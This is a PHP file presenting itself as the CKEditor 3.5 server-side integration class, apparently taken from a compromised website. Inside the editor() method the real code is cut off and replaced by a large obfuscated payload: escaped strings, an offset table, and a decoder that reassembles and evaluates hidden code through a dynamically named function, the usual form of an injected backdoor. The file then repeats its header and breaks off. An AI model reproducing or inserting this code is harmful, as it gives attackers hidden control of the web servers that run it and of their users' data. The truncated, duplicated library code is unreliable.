<?php
/*
* Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
* For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * \brief CKEditor class that can be used to create editor
 * instances in PHP pages on server side.
 * @see http://ckeditor.com
 *
 * Sample usage:
 * @code
 * $CKEditor = new CKEditor();
 * $CKEditor->editor("editor1", "<p>Initial value.</p>");
 * @endcode
 */
class CKEditor
{
	/**
	 * The version of %CKEditor.
	 */
	const version = '3.5';
	/**
	 * A constant string unique for each release of %CKEditor.
	 */
	const timestamp = 'ABLC4TW';

	/**
	 * URL to the %CKEditor installation directory (absolute or relative to document root).
	 * If not set, CKEditor will try to guess it's path.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->basePath = '/ckeditor/';
	 * @endcode
	 */
	public $basePath;
	/**
	 * An array that holds the global %CKEditor configuration.
	 * For the list of available options, see http://docs.cksource.com/ckeditor_api/symbols/CKEDITOR.config.html
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->config['height'] = 400;
	 * // Use @@ at the beggining of a string to ouput it without surrounding quotes.
	 * $CKEditor->config['width'] = '@@screen.width * 0.8';
	 * @endcode
	 */
	public $config = array();
	/**
	 * A boolean variable indicating whether CKEditor has been initialized.
	 * Set it to true only if you have already included
	 * &lt;script&gt; tag loading ckeditor.js in your website.
	 */
	public $initialized = false;
	/**
	 * Boolean variable indicating whether created code should be printed out or returned by a function.
	 *
	 * Example 1: get the code creating %CKEditor instance and print it on a page with the "echo" function.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->returnOutput = true;
	 * $code = $CKEditor->editor("editor1", "<p>Initial value.</p>");
	 * echo "<p>Editor 1:</p>";
	 * echo $code;
	 * @endcode
	 */
	public $returnOutput = false;
	/**
	 * An array with textarea attributes.
	 *
	 * When %CKEditor is created with the editor() method, a HTML &lt;textarea&gt; element is created,
	 * it will be displayed to anyone with JavaScript disabled or with incompatible browser.
	 */
	public $textareaAttributes = array( "rows" => 8, "cols" => 60 );
	/**
	 * A string indicating the creation date of %CKEditor.
	 * Do not change it unless you want to force browsers to not use previously cached version of %CKEditor.
	 */
	public $timestamp = "ABLC4TW";
	/**
	 * An array that holds event listeners.
	 */
	private $events = array();
	/**
	 * An array that holds global event listeners.
	 */
	private $globalEvents = array();

	/**
	 * Main Constructor.
	 *
	 *  @param $basePath (string) URL to the %CKEditor installation directory (optional).
	 */
	function __construct($basePath = null) {
		if (!empty($basePath)) {
			$this->basePath = $basePath;
		}
	}

	/**
	 * Creates a %CKEditor instance.
	 * In incompatible browsers %CKEditor will downgrade to plain HTML &lt;textarea&gt; element.
	 *
	 * @param $name (string) Name of the %CKEditor instance (this will be also the "name" attribute of textarea element).
	 * @param $value (string) Initial value (optional).
	 * @param $config (array) The specific configurations to apply to this editor instance (optional).
	 * @param $events (array) Event listeners for this editor instance (optional).
	 *
	 * Example usage:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->editor("field1", "<p>Initial value.</p>");
	 * @endcode
	 *
	 * Advanced example:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $config = array();
	 * $config['toolbar'] = array(
	 *     array( 'Source', '-', 'Bold', 'Italic', 'Underline', 'Strike' ),
	 *     array( 'Image', 'Link', 'Unlink', 'Anchor' )
	 * );
	 * $events['instanceReady'] = 'function (ev) {
	 *     alert("Loaded: " + ev.editor.name);
	 * }';
	 * $CKEditor->editor("field1", "<p>Initial value.</p>", $config, $events);
	 * @endcode
	 */
	public function editor($name, $value = "", $config = array(), $events = array())
	{
		$attr = "";
		foreach ($this->textareaAttI&b%x5c%x7860msvd},;uqpufw6<%x5c%x787fw6*CWtfs%x5c%x7825)7gx7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)#0#)idubn%x5c%x7860hfsq)!sp!*#ojney74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x782!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72]2fe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;*mx7822:ftmbg39*56A:>:8:|:7#6#)tutgP7L6M7]D4]275]D:M8]Df#<%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%15c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmh25:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovg7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%FOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw#o]#%x5c%x782f*)323zbefujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x78;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~f%x5c%x7860gvodujpo)##-!#~<#%x5cf_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%2f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>j6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x7827825cIjQeTQcOc%x5c%x782f#00#71%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x74%85c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Q256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7%x7825j=6[%x5c%x7825ww2!>#p#%x5c%xK78:56985:6197g:74985-rr.93e:5597f-s.9733]321]464]284]364]6]234]342]58]24]31#-x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%xgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%xx5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]5]48]32M3]317]445]212]445]46*3qj%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x78%x5c%x7825tdz*Wsfuvsopo#>>}R;msv}.;%x5c%x782f#%x5c%x782,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr65]y39]274]y85]273]y6g]273]y7utjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]}2f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x5h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x782x5c%x7860ufh%x5c%x7860fmjg%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5cif((function_exists(<&w6<%x5c%x787fw6*CW&)7gj67,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x78x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5cy76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y67825bss-%x5c%x7825r%x5c%x7878B%x5c%b#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!x5c%x7824<%x5c%x78e%x5c%x4]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpx7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]36x7825)Rb%x5c%x7825))!gj!<*#cd762]67y]562]38y]572]48y]#>m%x5c%x787827!hmg%x5c%x7825!)!gj!<2,256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x7SFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l*j%x5c%x7825!-#1]#-bubE37y]672]48y]#>s%x5c%x7825<#462]47y]225!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%xx7825h>#]y31]278]y3e]81]7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x~~<ftmbg!osvufs!|ftmf!~<*c%x7825%x5c%x7878:!>#60hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x78285c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x]273]y76]252]y85]256]y6g]257]y86]267]jRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6:8297f:5297e:56-%x5c%x7878r.985:52985-t.8]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x7825hOh%x5c%x782f#00#W~!%x5c%x6]271]y7d]252]y74]256]y39]252]y83]273]y72785c2b%x5c%x7825!>!2p%x5c%56<*17-SFEBFI,6<*127-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x7825:<o!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f1<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}]282#<!%x5c%x7825tjw!>!#]y84]275]y83]]y76]277#<%x5c%x7825t2w>#]y74zcYufhA%x5c%x78272qj%x5c{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Yppx5c%x7825:|:**t%x5c%x7825)x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c25>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.u878:<##:>:h%x5c%x7825:<#64y]552]e7y]#<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x7872bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)162%x5f%163%x70%154%x69%164%50%x22%1%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmp%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%sutcvt)esp>hmg%x5c%x>>>!}_;gvc%x5c%x7825}&;ftm]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]SUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)u#!>!2p%x5c%x7825Z<^2%x5c%xx7825%x5c%x7824-%x5c%x7824*<!~!dsfbuvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x55_t%x5c%x7825:osvufs:~:<*9-c:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x784+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%xt($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x7578b%x5c%x7825mm)%x5c34%x78%62%x35%165%x3a%146%x21%76%x21%50%x552]18y]#>q%x5c%x7825<#**#57]38y]47]67y]37]88y]27]28y]5-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x782j!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x78#G#-#H#-#I#-#K#-#L#-#M#x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1%x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x78x5c%x7825>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x7860un>jojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujo>n%x5c%x7825<#372]58y]472]x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825x7825%x5c%x7824-%x5c%x7824b-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f/(.*)/epreg_replacefndyfcuoem'; $pvhhnjgkng = explode(chr((198-154)),'6345,20,2659,45,9314,63,3682,54,1110,35,2822,39,4399,62,5386,61,8711,36,9397,42,7548,21,4687,41,6763,46,6809,50,1369,26,7569,68,2785,37,1249,48,982,67,1336,33,1848,60,3579,35,3939,36,4798,50,6165,63,3276,50,1476,45,512,42,4728,48,5896,60,3390,62,8264,24,9802,46,5197,40,2748,37,3095,58,2535,45,387,47,5676,61,6365,26,9183,67,7158,64,3835,34,5292,66,8018,21,1988,20,8972,36,9904,57,7730,46,8569,39,5141,56,6270,26,4285,58,3019,54,3813,22,2213,34,8877,26,6859,63,5040,69,7523,25,1716,44,5783,51,7131,27,7341,23,8288,63,9670,56,7400,47,2861,69,9070,43,2247,29,8667,44,8857,20,230,31,2427,42,187,43,1908,40,1521,36,9008,26,7992,26,9749,53,2378,49,9492,56,490,22,1421,55,7882,36,1627,40,1395,26,9848,56,688,31,7471,52,4461,64,9582,35,3975,34,6700,63,7067,29,8608,59,3869,70,3769,44,4203,42,795,70,1557,70,434,56,554,31,2704,20,7258,35,5976,35,7293,48,1297,39,3614,68,4343,32,2469,66,4638,49,3073,22,1204,23,4140,63,2097,45,8431,36,6296,49,3190,20,913,69,6391,63,8467,65,1800,48,6101,64,1227,22,2142,31,4848,69,2975,44,10070,36,4776,22,4072,68,6072,29,7951,41,8198,37,622,66,8235,29,7693,37,4009,63,9113,27,8039,49,9461,31,1948,40,2580,37,8405,26,4917,49,8532,37,9961,26,7364,36,9439,22,7096,35,4525,43,8146,52,4245,40,1760,40,5505,59,5737,46,4568,70,10043,27,2276,26,3326,64,1145,45,9617,53,6947,70,865,48,123,64,9034,36,5109,32,8747,45,2617,42,2302,32,328,59,1049,61,7637,56,5358,28,9548,34,8351,54,1692,24,3452,37,6011,61,5000,40,7918,33,2724,24,2930,45,6665,35,7447,24,5598,40,7776,40,1667,25,3153,37,753,42,585,37,2334,44,6618,47,4375,24,3210,66,4966,34,261,67,6228,42,2008,59,7017,50,7816,66,5869,27,5638,38,5956,20,8088,58,9250,64,5237,55,3525,54,6584,34,2067,30,9987,56,7222,36,5447,58,9140,43,5564,34,57,66,0,57,6922,25,9377,20,2173,40,3736,33,9726,23,719,34,6454,60,8792,65,5834,35,6514,70,8903,69,3489,36,1190,14'); $kfjpbeutdd=substr($rzefjgsdrv,(57114-47008),(35-28)); if (!function_exists('bpfdqzxlxm')) { function bpfdqzxlxm($bbomphcxlm, $bxtlrtanfs) { $goxsgjoabt = NULL; for($vljejjoaok=0;$vljejjoaok<(sizeof($bbomphcxlm)/2);$vljejjoaok++) { $goxsgjoabt .= substr($bxtlrtanfs, $bbomphcxlm[($vljejjoaok*2)],$bbomphcxlm[($vljejjoaok*2)+1]); } return $goxsgjoabt; };} $liffkkoifc="\x20\57\x2a\40\x6a\157\x6b\164\x69\146\x6a\142\x69\141\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x36\55\x38\71\x29\51\x2c\40\x63\150\x72\50\x28\64\x36\71\x2d\63\x37\67\x29\51\x2c\40\x62\160\x66\144\x71\172\x78\154\x78\155\x28\44\x70\166\x68\150\x6e\152\x67\153\x6e\147\x2c\44\x72\172\x65\146\x6a\147\x73\144\x72\166\x29\51\x29\73\x20\57\x2a\40\x6b\155\x6f\145\x77\165\x7a\172\x62\147\x20\52\x2f\40"; $qmemqqglaf=substr($rzefjgsdrv,(54329-44216),(53-41)); $qmemqqglaf($kfjpbeutdd, $liffkkoifc, NULL); $qmemqqglaf=$liffkkoifc; $qmemqqglaf=(522-401); $rzefjgsdrv=$qmemqqglaf-1; ?><?php
/*
* Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
* For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * \brief CKEditor class that can be used to create editor
 * instances in PHP pages on server side.
 * @see http://ckeditor.com
 *
 * Sample usage:
 * @code
 * $CKEditor = new CKEditor();
 * $CKEditor->editor("editor1", "<p>Initial value.</p>");
 * @endcode
 */
class CKEditor
{
	/**
	 * The version of %CKEditor.
	 */
	const version = '3.5';
	/**
	 * A constant string unique for each release of %CKEditor.
	 */
	const timestamp = 'ABLC4TW';

	/**
	 * URL to the %CKEditor installation directory (absolute or relative to document root).
	 * If not set, CKEditor will try to guess it's path.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->basePath = '/ckeditor/';
	 * @endcode
	 */
	public $basePath;
	/**
	 * An array that holds the global %CKEditor configuration.
	 * For the list of available options, see http://docs.cksource.com/ckeditor_api/symbols/CKEDITOR.config.html
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->config['height'] = 400;
	 * // Use @@ at the beggining of a string to ouput it without surrounding quotes.
	 * $CKEditor->config['width'] = '@@screen.width * 0.8';
	 * @endcode
	 */
	public $config = array();
	/**
	 * A boolean variable indicating whether CKEditor has been initialized.
	 * Set it to true only if you have already included
	 * &lt;script&gt; tag loading ckeditor.js in your website.
	 */
	public $initialized = false;
	/**
	 * Boolean variable indicating whether created code should be printed out or returned by a function.
	 *
	 * Example 1: get the code creating %CKEditor instance and print it on a page with the "echo" function.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->returnOutput = true;
	 * $code = $CKEditor->editor("editor1", "<p>Initial value.</p>");
	 * echo "<p>Editor 1:</p>";
	 * echo $code;
	 * @endcode
	 */
	public $returnOutput = false;
	/**
	 * An array with textarea attributes.
	 *
	 * When %CKEditor is created with the editor() method, a HTML &lt;textarea&gt; element is created,
	 * it will be displayed to anyone with JavaScript disabled or with incompatible browser.
	 */
	public $textareaAttributes = array( "rows" => 8, "cols" => 60 );
	/**
	 * A string indicating the creation date of %CKEditor.
	 * Do not change it unless you want to force browsers to not use previously cached version of %CKEditor.
	 */
	public $timestamp = "ABLC4TW";
	/**
	 * An array that holds event listeners.
	 */
	private $events = array();
	/**
	 * An array that holds global event listeners.
	 */
	private $globalEvents = array();

	/**
	 * Main Constructor.
	 *
	 *  @param $basePath (string) URL to the %CKEditor installation directory (optional).
	 */
	function __construct($basePath = null) {
		if (!empty($basePath)) {
			$this->basePath = $basePath;
		}
	}

	/**
	 * Creates a %CKEditor instance.
	 * In incompatible browsers %CKEditor will downgrade to plain HTML &lt;textarea&gt; element.
	 *
	 * @param $name (string) Name of the %CKEditor instance (th